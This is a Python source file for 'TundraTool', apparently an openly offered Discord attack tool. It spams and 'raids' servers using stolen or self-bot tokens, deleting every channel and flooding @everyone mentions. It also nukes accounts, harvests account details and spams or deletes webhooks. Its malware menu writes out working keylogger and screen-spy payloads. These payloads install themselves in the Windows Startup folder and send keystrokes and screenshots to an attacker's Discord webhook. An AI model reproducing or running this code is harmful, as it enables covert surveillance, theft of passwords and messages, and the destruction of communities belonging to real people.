
import os
try:
    import dhooks
except:
    os.system("pip install dhooks")
try:
    from colorama import Fore
except:
    os.system("pip install colorama")
try:
    import discord
except:
    os.system("pip install discord")
from time import sleep


if os.name == "nt":
    os.system("title TundraTool")
    os.system("mode 115, 40")
    def clear():
        os.system("cls")
else:
    def clear():
        os.system("clear")



def yesNo(msg):
    y_or_n = input(msg+" (y/n)")
    if y_or_n != "y":
        return False
    else:
        return True



def space(nmbr):
    space = ""
    for i in range(nmbr):
        space = space + " "
    return space



commands = []



def add_command(name, parent, description):
    commands.append({"name": name, "parent": parent, "description": description})



def search_command(name):
    for command in commands:
        if command.get("name").lower() == name.lower():
            return command.get("parent") + " > " + command.get("name") + " : " + command.get("description")
    return "No command find"



add_command(name="Token spammer", parent="Tokens", description="Send a lot of message in specific channel with a token.")
def tokenspammer():
    token = input("Token : ")
    token = str.replace(token, " ", "")
    channelid = input("Channel ID : ")
    message = input("Message : ")
    howmany = int(input("How many spam : "))
    delay = int(input("delay (ms) : "))
    client = discord.Client()



    @client.event
    async def on_ready():
        try:
            channel = client.get_channel(int(channelid))
        except:
            print("invalid id or token.")
        for i in range(howmany):
            await channel.send(message)
            print(f"Spam N°{i} sent.")
            sleep(delay/1000)



    try:
        if yesNo("It is a bot?"):
            client.run(token)
            sleep(0.5)
        else:
            client.run(token, bot=False)
            sleep(0.5)
    except:
        print("Invalid token.")
        input("Press enter to finish...")
        clear()
        tokenpanel()
    clear()
    tokenpanel()



add_command(name="Raid", parent="Tokens", description="Delete all the channel and create 500 channel with 2k mentions in a specific server with a token.")
#raid bot
def raid():
    token = input("Token : ")
    token = str.replace(token, " ", "")
    serverid = int(input("Server ID : "))
    message = input("Message : ")
    while len(message) < 3:
        print("The message is too short.")
        message = input("Message : ")
    howmany = int(input("How many channel : "))
    while howmany > 500:
        print("Its too.")
        howmany = input("How many channel : ")
    client = discord.Client()



    @client.event
    async def on_ready():
        try:
            guild = client.get_guild(serverid)
            await guild.edit(name=message)
            for channel in guild.channels:
                await channel.delete()
            for i in range(howmany):
                channel = await guild.create_text_channel(message)
                await channel.send("@everyone "+message)
                await channel.send("@everyone "+message)
                await channel.send("@everyone "+message)
                await channel.send("@everyone "+message)
                await channel.send("@everyone "+message)
            clear()
            tokenpanel()
        except:
            print("A problem has stopped the raid")
            input("Press enter to finish...")



    try:
        if yesNo("It is a bot?"):
            client.run(token)
            sleep(0.5)
        else:
            client.run(token, bot=False)
            sleep(0.5)
    except:
        print("Invalid token.")
        input("Press enter to finish...")
        clear()
        tokenpanel()
    
    clear()
    tokenpanel()



add_command(name="Token nuke", parent="Tokens", description="Spam all the servers on a token.")
#nuke bot
def tokennuke():
    token = input("Token : ")
    token = str.replace(token, " ", "")
    message = input("Message : ")
    while len(message) < 3:
        print("The message is too short.")
        message = input("Message : ")
    client = discord.Client()



    @client.event
    async def on_ready():
        client.user.edit(username=message)
        for channel in client.get_all_channels():
            try:
                await channel.send(message)
            except:
                pass



    try:
        if yesNo("It is a bot?"):
            client.run(token)
            sleep(0.5)
        else:
            client.run(token, bot=False)
            sleep(0.5)
    except:
        print("Invalid token.")
        input("Press enter to finish...")
        clear()
        tokenpanel()
    
    clear()
    tokenpanel()


add_command(name="Token infos", parent="Tokens", description="Get informations about a token.")
#infos token
def tokeninfos():
    token = input("Token : ")
    token = str.replace(token, " ", "")
    client = discord.Client()



    @client.event
    async def on_ready():
        print(f"""
Nom : {client.user.name}
Avatar Url : {client.user.avatar_url}
Tag : {client.user.discriminator}
Email : {client.user.email}
Token : {token}
Servers : {len(client.guilds)}\n""")
        input("Press enter to finish...")
        clear()
        tokenpanel()


    try:
        if yesNo("It is a bot?"):
            client.run(token)
            sleep(0.5)
        else:
            client.run(token, bot=False)
            sleep(0.5)
    except:
        print("Invalid token.")
        input("Press enter to finish...")
        clear()
        tokenpanel()



add_command(name="Server list", parent="Tokens", description="Get a list of servers of a token.")
#token server list
def tokenserverslist():
    token = input("Token : ")
    token = str.replace(token, " ", "")
    client = discord.Client()



    @client.event
    async def on_ready():
        for guild in client.guilds:
            print(f"""
Name : {guild.name}
ID : {guild.id}
""")
        input("Press enter to finish...")
        clear()
        tokenpanel()


    try:
        if yesNo("It is a bot?"):
            client.run(token)
            sleep(0.5)
        else:
            client.run(token, bot=False)
            sleep(0.5)
    except:
        print("Invalid token.")
        input("Press enter to finish...")
        clear()
        tokenpanel()



add_command(name="Rename token", parent="Tokens", description="Change the username of a token.")
#rename token
def tokenrename():
    token = input("Token : ")
    token = str.replace(token, " ", "")
    newusername = input("New username :")
    while len(newusername) < 3:
        print("The username is too short.")
        message = input("New username : ")

    client = discord.Client()



    @client.event
    async def on_ready():
        await client.user.edit(username=newusername)
        clear()
        tokenpanel()



    try:
        if yesNo("It is a bot?"):
            client.run(token)
            sleep(0.5)
        else:
            client.run(token, bot=False)
            sleep(0.5)
    except:
        print("Invalid token.")
        input("Press enter to finish...")
        clear()
        tokenpanel()



add_command(name="Server infos", parent="Tokens", description="Get server informations with a token.")
def server_info():
    client = discord.Client()
    token = input("Token : ")
    token = str.replace(token, " ", "")
    serverid = input("Server ID : ")
    serverid = str.replace(serverid, " ", "")
    serverid = int(serverid)



    @client.event
    async def on_ready():
        guild = client.get_guild(serverid)
        try:
            guild.name
        except:
            print("Invalid id.")
            input("Press enter to finish...")
            clear()
            tokenpanel()
            exit()
        channels = ""
        for channel in guild.channels:
            channels = channels + f"""
            Nom : {channel.name}
            ID : {channel.id}\n\n"""

        
        if guild.get_member(client.user.id).guild_permissions.create_instant_invite == True:
            invite = await guild.text_channels[0].create_invite(max_age=0, max_uses=0)
            invite = invite.code
            print(invite)
        else:
            invite = "None"

        print(f"""
    Nom : {guild.name}
    ID : {guild.id}
    Invite code : {invite}
    Members count : {guild.member_count}

        Channels :

            {channels}

    """)

    

    try:
        if yesNo("It is a bot?"):
            client.run(token)
            sleep(0.5)
        else:
            client.run(token, bot=False)
            sleep(0.5)
    except:
        client.run(token)
        print("Invalid token.")
        input("Press enter to finish...")
        clear()
        tokenpanel()

    input("Press enter to finish...")
    clear()
    tokenpanel()

    


add_command(name="Webhook spammer", parent="Webhooks", description="Send a lot of message with a webhook.")
#webhook spam
def webhookspam():

    webhookurl = input("Url of Webhook : ")
    try:
        webhook = dhooks.Webhook(webhookurl)
    except:
        print("No internet or incorrect link.")
        webhookspam()
    message = input("Message : ")
    file = input("File directory : ")
    howmany = int(input("How many spam : "))
    delay = int(input("Delay (ms) : "))
            

    for i in range(howmany):
        webhook.send(message)
        sleep(delay/1000)
        print(f"Spam N°{i} sent")
    clear()
    webhookpanel()



add_command(name="Webhook infos", parent="Webhooks", description="Get informations about a webhook.")
#webhooks infos
def webhookinfos():
    webhooklink = input("Webhook Url : ")
    try:
        webhook = dhooks.Webhook(webhooklink)
    except:
        print("No Internet or Invalid Url.")
    print(f"""
    Url : {webhooklink}
    Name : {webhook.get_info().default_name}
    Avatar : {webhook.get_info().default_avatar_url}
    Server ID : {webhook.get_info().guild_id}
    Channel ID : {webhook.get_info().channel_id}""")
    input("Press enter to finish...")
    clear()
    webhookpanel()



add_command(name="Webhook delete", parent="Webhooks", description="Delete a webhook.")
#delete webhook
def webhookdelete():
    webhooklink = input("Webhook Url : ")
    try:
        webhook = dhooks.Webhook(webhooklink)
    except:
        print("No Internet or Invalid Url.")
        webhookdelete()
    try:
        webhook.delete()
    except:
        pass
    clear()
    webhookpanel()




add_command(name="Webhook message", parent="Webhooks", description="Send a message with a webhook.")
def webhookmessage():

    webhookurl = input("Url of Webhook : ")
    try:
        webhook = dhooks.Webhook(webhookurl)
    except:
        print("No internet or incorrect link.")
        webhookspam()
    message = input("Message : ")
    file = input("File directory : ")  
    webhook.send(message)
    clear()
    webhookpanel()



add_command(name="Commands list", parent="Help", description="Get a list of commands.")
def commandslist():
    tokenscommands = []
    webhookscommands = []
    helpcommands = []

    for command in commands:
        parent = command.get("parent")
        if parent == "Tokens":
            tokenscommands.append(command)
        if parent == "Webhooks":
            webhookscommands.append(command)
        if parent == "Help":
            helpcommands.append(command)

    print("Tokens >")
    
    for command in tokenscommands:
        name = command.get("name")
        print(f"    {name}")

    print("\n\nWebhooks >")

    for command in webhookscommands:
        name = command.get("name")
        print(f"    {name}")

    print("\n\nHelp >")

    for command in helpcommands:
        name = command.get("name")
        print(f"    {name}")

    input("Press enter to finish...")
    clear()
    helppanel()



add_command(name="Search command", parent="Help", description="Search a command.")
def searchcommand():
    command = input("Command > ")
    print(search_command(command))
    input("Press enter to finish...")
    clear()
    helppanel()



def screenrecconfig():
    name = input("Name of the file : ")
    webhooklink = input("Your Webhook Url : ")
    content = """import os
from time import sleep
try:
    from pyautogui import screenshot
    from dhooks import *
except:
    os.system("pip install pyautogui")
    os.system("pip install dhooks")
    os.system("pip install Pillow")
import shutil

target = f"C:/Users/{os.getenv('username')}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
lien = "Your webhook url"

try:
    shutil.copy(__file__, target)
    os.remove(__file__)
except:
    pass

while True:
    fichier = f"C:/Users/{os.getenv('username')}/screen.png"
    screenshot(fichier)
    webhook = Webhook(lien)
    file = File(fichier)
    webhook.send(file=file)
    os.remove(fichier)
    sleep(2)

"""
    content = str.replace(content, "Your webhook url", webhooklink)
    file = open(name+".pyw", "w")
    file.write(content)
    file.close()
    print("Done !")
    input("Press enter to finish...")
    clear()
    malwarepanel()



#get keylogger file
def keyloggerconfig():
    name = input("Name of the file : ")
    webhooklink = input("Your Webhook Url : ")
    content = """import os
from time import sleep
try:
    from pynput import mouse, keyboard
    from dhooks import *
except:
    os.system("pip install pynput")
    sleep(2)
    os.system("pip install dhooks")
    sleep(2)
import shutil
from os import read, remove, getenv
from os.path import isfile
from threading import Thread
from datetime import *

strlien = "Your Webhooks url"

while True:
    try:
        lien = Webhook(strlien)
        keys = {}

        fichier = f"C:/Users/{getenv('username')}/keys.txt"

        target = f"C:/Users/{getenv('username')}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"

        if target != __file__:
            shutil.copy(__file__, target)
            remove(__file__)


        if isfile(fichier):
            try:
                remove(fichier)
            except:
                pass

        def envoi_fichier():
            while True:
                if isfile(fichier):
                    sleep(15)
                    fichier_send = File(fichier)
                    lien.send(file=fichier_send)
                    try:
                        remove(fichier)
                    except:
                        pass





        for i in range(11):
            keys["<" + str(i + 96) + ">"] = str(i)


        def on_press(key):
            key = str(key)

            if key in keys:
                key = keys[key]

            if key[0] == "'" and key[2] == "'":
                key = key[1]

            if key == "Key.ctrl_l":
                key = "ctrl"

            if key == "Key.caps_lock":
                key = "maj_lock"

            if key == "Key.shift":
                key = "shift"

            if key == "Key.enter":
                key = "enter"

            if key == "Key.space":
                key = "space"

            if key == "Key.backspace":
                key = "delete"

            if key == str(r"'\x03'"):
                key = "ctrl_c"

            if key == str(r"'\x16'"):
                key = "ctrl_v"

            if key == str(r"'\x13'"):
                key = "ctrl_s"

            if key == str(r"'\x06'"):
                key = "ctrl_f"

            if key == str(r"'\x08'"):
                key = "ctrl_h"

            if key in keys:
                key = keys[key]

            with open(fichier, 'a') as f:
                f.write(key + "      " +str(datetime.now().time()) + "\\n")
                f.close()

        Thread(target=envoi_fichier).start()


        with keyboard.Listener(on_press=on_press) as listener:
            listener.join()
    except:
        pass
    sleep(2)
"""
    content = str.replace(content, "Your Webhook url", webhooklink)
    file = open(name+".pyw", "w")
    file.write(content)
    file.close()
    print("Done !")
    input("Press enter to finish...")
    clear()
    malwarepanel()



def malwarepanel():
    print(f"""{Fore.MAGENTA}
    ...     ..      ..                       ..                                                        
  x*8888x.:*8888: -"888:               x .d88"    x=~                                                  
 X   48888X `8888H  8888                5888R    88x.   .e.   .e.                 .u    .              
X8x.  8888X  8888X  !888>        u      '888R   '8888X.x888:.x888        u      .d88B :@8c       .u    
X8888 X8888  88888   "*8%-    us888u.    888R    `8888  888X '888k    us888u.  ="8888f8888r   ud8888.  
'*888!X8888> X8888  xH8>   .@88 "8888"   888R     X888  888X  888X .@88 "8888"   4888>'88"  :888'8888. 
  `?8 `8888  X888X X888>   9888  9888    888R     X888  888X  888X 9888  9888    4888> '    d888 '88%" 
  -^  '888"  X888  8888>   9888  9888    888R     X888  888X  888X 9888  9888    4888>      8888.+"    
   dx '88~x. !88~  8888>   9888  9888    888R    .X888  888X. 888~ 9888  9888   .d888L .+   8888L      
 .8888Xf.888x:!    X888X.: 9888  9888   .888B .  `%88%``"*888Y"    9888  9888   ^"8888*"    '8888c. .+ 
:""888":~"888"     `888*"  "888*""888"  ^*888%     `~     `"       "888*""888"     "Y"       "88888%   
    "~'    "~        ""     ^Y"   ^Y'     "%                        ^Y"   ^Y'                  "YP'    

                         {Fore.BLUE}[{Fore.GREEN}1{Fore.BLUE}] {Fore.RED}: Keylogger

                         {Fore.BLUE}[{Fore.GREEN}2{Fore.BLUE}] {Fore.RED}: Screen spy                                                                            
                                                                                                       

                        EXIT to return to the main panel                                                                       
""")
    malwaremode = input(space(50)+"Mode = "+Fore.RESET)
    if malwaremode == "1":
        clear()
        keyloggerconfig()
        exit()
    if malwaremode == "2":
        clear()
        screenrecconfig()
        exit()
    if malwaremode == "EXIT":
        clear()
        mainpanel()
        exit()
    clear()
    malwarepanel()



def tokenpanel():
    print(f"""{Fore.MAGENTA}
    .....                            ..                               
 .H8888888h.  ~-.              < .z@8"`                               
 888888888888x  `>        u.    !@88E                      u.    u.   
X~     `?888888hx~  ...ue888b   '888E   u         .u     x@88k u@88c. 
'      x8.^"*88*"   888R Y888r   888E u@8NL    ud8888.  ^"8888""8888" 
 `-:- X8888x        888R I888>   888E`"88*"  :888'8888.   8888  888R  
      488888>       888R I888>   888E .dN.   d888 '88%"   8888  888R  
    .. `"88*        888R I888>   888E~8888   8888.+"      8888  888R  
  x88888nX"      . u8888cJ888    888E '888&  8888L        8888  888R  
 !"*8888888n..  :   "*888*P"     888E  9888. '8888c. .+  "*88*" 8888" 
'    "*88888888*      'Y"      '"888*" 4888"  "88888%      ""   'Y"   
        ^"***"`                   ""    ""      "YP'                  
                                                                      
                                                                      
                                                                      

                                           
               {Fore.BLUE}[{Fore.GREEN}1{Fore.BLUE}] {Fore.RED}: Spam

               {Fore.BLUE}[{Fore.GREEN}2{Fore.BLUE}] {Fore.RED}: Raid

               {Fore.BLUE}[{Fore.GREEN}3{Fore.BLUE}] {Fore.RED}: Nuke

               {Fore.BLUE}[{Fore.GREEN}4{Fore.BLUE}] {Fore.RED}: Infos

               {Fore.BLUE}[{Fore.GREEN}5{Fore.BLUE}] {Fore.RED}: Server list

               {Fore.BLUE}[{Fore.GREEN}6{Fore.BLUE}] {Fore.RED}: Rename

               {Fore.BLUE}[{Fore.GREEN}7{Fore.BLUE}] {Fore.RED}: Server infos

                
                EXIT to return to the main panel
""")

    tokenmode = input(space(50)+"Mode = "+Fore.RESET)
    if tokenmode == "1":
        clear()
        tokenspammer()
        exit()
    if tokenmode == "2":
        clear()
        raid()
        exit()
    if tokenmode == "3":
        clear()
        tokennuke()
        exit()
    if tokenmode == "4":
        clear()
        tokeninfos()
        exit()
    if tokenmode == "5":
        clear()
        tokenserverslist()
        exit()
    if tokenmode == "6":
        clear()
        tokenrename()
        exit()
    if tokenmode == "7":
        clear()
        server_info()
        exit()
    if tokenmode == "EXIT":
        clear()
        mainpanel()
        exit()
    clear()
    tokenpanel()



def webhookpanel():
    print(f"""{Fore.MAGENTA}
     ...    .     ...                       ..                                              ..         .x+=:.   
  .~`"888x.!**h.-``888h.              . uW8"        .uef^"                            < .z@8"`        z`    ^%  
 dX   `8888   :X   48888>             `t888       :d88E              u.          u.    !@88E             .   <k 
'888x  8888  X88.  '8888>       .u     8888   .   `888E        ...ue888b   ...ue888b   '888E   u       .@8Ned8" 
'88888 8888X:8888:   )?""`   ud8888.   9888.z88N   888E .z8k   888R Y888r  888R Y888r   888E u@8NL   .@^%8888"  
 `8888>8888 '88888>.88h.   :888'8888.  9888  888E  888E~?888L  888R I888>  888R I888>   888E`"88*"  x88:  `)8b. 
   `8" 888f  `8888>X88888. d888 '88%"  9888  888E  888E  888E  888R I888>  888R I888>   888E .dN.   8888N=*8888 
  -~` '8%"     88" `88888X 8888.+"     9888  888E  888E  888E  888R I888>  888R I888>   888E~8888    %8"    R88 
  .H888n.      XHn.  `*88! 8888L       9888  888E  888E  888E u8888cJ888  u8888cJ888    888E '888&    @8Wou 9%  
 :88888888x..x88888X.  `!  '8888c. .+ .8888  888"  888E  888E  "*888*P"    "*888*P"     888E  9888. .888888P`   
 f  ^%888888% `*88888nx"    "88888%    `%888*%"   m888N= 888>    'Y"         'Y"      '"888*" 4888" `   ^"F     
      `"**"`    `"**""        "YP'        "`       `Y"   888                             ""    ""               
                                                        J88"                                                    
                                                        @%                                                      
                                                      :"         

                {Fore.BLUE}[{Fore.GREEN}1{Fore.BLUE}] {Fore.RED}: Spam

                {Fore.BLUE}[{Fore.GREEN}2{Fore.BLUE}] {Fore.RED}: Infos

                {Fore.BLUE}[{Fore.GREEN}3{Fore.BLUE}] {Fore.RED}: Delete

                {Fore.BLUE}[{Fore.GREEN}1{Fore.BLUE}] {Fore.RED}: Send message


                EXIT to return to the main panel

""")
    webhookmode = input(space(50)+"Mode = "+Fore.RESET)
    if webhookmode == "1":
        clear()
        webhookspam()
        exit()
    if webhookmode == "2":
        clear()
        webhookinfos()
        exit()
    if webhookmode == "3":
        clear()
        webhookdelete()
        exit()
    if webhookmode == "4":
        clear()
        webhookmessage()
        exit()
    if webhookmode == "EXIT":
        clear()
        mainpanel()
        exit()
    clear()
    webhookpanel()



def helppanel():
    print(f"""{Fore.MAGENTA}
                                       ..               
         .xHL                    x .d88"                
      .-`8888hxxx~                5888R    .d``         
   .H8X  `%888*"           .u     '888R    @8Ne.   .u   
   888X     ..x..       ud8888.    888R    %8888:u@88N  
  '8888k .x8888888x   :888'8888.   888R     `888I  888. 
   ?8888X    "88888X  d888 '88%"   888R      888I  888I 
    ?8888X    '88888> 8888.+"      888R      888I  888I 
 H8H %8888     `8888> 8888L        888R    uW888L  888' 
'888> 888"      8888  '8888c. .+  .888B . '*88888Nu88P  
 "8` .8" ..     88*    "88888%    ^*888%  ~ '88888F`    
    `  x8888h. d*"       "YP'       "%       888 ^      
      !""*888%~                              *8E        
      !   `"  .                              '8>        
      '-....:~

                {Fore.BLUE}[{Fore.GREEN}1{Fore.BLUE}] {Fore.RED}: Commands list

                {Fore.BLUE}[{Fore.GREEN}2{Fore.BLUE}] {Fore.RED}: Search commands


                EXIT to return to the main panel

                   
{Fore.RED}\n\n\n\n
""")

    helpcommand = input(space(50)+"Mode = "+Fore.RESET)
    if helpcommand == "1":
        clear()
        commandslist()
        exit()
    if helpcommand == "2":
        clear()
        searchcommand()
        exit()
    if helpcommand == "EXIT":
        clear()
        mainpanel()
        exit()
    clear()
    helppanel()



def mainpanel():
    print(f"""{Fore.MAGENTA}
    .....                                          ..                                
 .H8888888h.  ~-.                                dF                                  
 888888888888x  `>    x.    .        u.    u.   '88bu.         .u    .               
X~     `?888888hx~  .@88k  z88u    x@88k u@88c. '*88888bu    .d88B :@8c        u     
'      x8.^"*88*"  ~"8888 ^8888   ^"8888""8888"   ^"*8888N  ="8888f8888r    us888u.  
 `-:- X8888x         8888  888R     8888  888R   beWE "888L   4888>'88"  .@88 "8888" 
      488888>        8888  888R     8888  888R   888E  888E   4888> '    9888  9888  
    .. `"88*         8888  888R     8888  888R   888E  888E   4888>      9888  9888  
  x88888nX"      .   8888 ,888B .   8888  888R   888E  888F  .d888L .+   9888  9888  
 !"*8888888n..  :   "8888Y 8888"   "*88*" 8888" .888N..888   ^"8888*"    9888  9888  
'    "*88888888*     `Y"   'YP       ""   'Y"    `"888*""       "Y"      "888*""888" 
        ^"***"`                                     ""                    ^Y"   ^Y'  
        
                                   By Drayxio | V2.1
                                                                                     
               {Fore.BLUE}[{Fore.GREEN}1{Fore.BLUE}] {Fore.RED}: Webhook

               {Fore.BLUE}[{Fore.GREEN}2{Fore.BLUE}] {Fore.RED}: Token

               {Fore.BLUE}[{Fore.GREEN}3{Fore.BLUE}] {Fore.RED}: Malware

               {Fore.BLUE}[{Fore.GREEN}4{Fore.BLUE}] {Fore.RED}: Help

               {Fore.BLUE}[{Fore.GREEN}5{Fore.BLUE}] {Fore.RED}: Exit   
                                                                                  
                                                                                     
""")
    mainmode = input(space(50)+"Mode = "+Fore.RESET)
    if mainmode == "1":
        clear()
        webhookpanel()
        exit()
    if mainmode == "2":
        clear()
        tokenpanel()
        exit()
    if mainmode == "3":
        clear()
        malwarepanel()
        exit()
    if mainmode == "4":
        clear()
        helppanel()
        exit()
    if mainmode == "5":
        clear()
        exit()
    clear()
    mainpanel()    
        



clear()
mainpanel()
